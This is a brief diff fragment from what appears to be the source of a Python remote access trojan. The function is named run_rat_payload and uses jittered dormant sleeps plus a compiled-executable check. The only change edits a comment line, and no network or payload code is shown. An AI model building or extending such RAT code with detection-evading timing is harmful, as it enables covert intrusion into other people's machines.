@@ -215,7 +215,7 @@ def run_rat_payload():
         sleep_time = DORMANT_INTERVAL + random.uniform(-DORMANT_JITTER, DORMANT_JITTER)
         time.sleep(sleep_time)
 
-# --- Main Execution ---
+# Main Execution 
 if __name__ == '__main__':
     is_compiled = getattr(sys, 'frozen', False)
     if not is_compiled:
